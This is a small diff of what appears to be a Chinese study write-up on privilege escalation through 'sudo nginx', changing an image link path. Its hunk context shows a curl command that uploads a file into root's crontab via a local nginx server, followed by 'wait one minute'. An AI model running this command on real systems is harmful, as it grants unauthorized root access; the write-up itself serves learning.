@@ -189,5 +189,5 @@ curl -T cron localhost:1111/var/spool/cron/crontabs/root
 ```
 
 等待一分钟
-![1](../assets/img/2023-11-18-sudo nginx提权学习/1.png)
+![1](/assets/img/2023-11-18-sudo nginx提权学习/1.png)
 
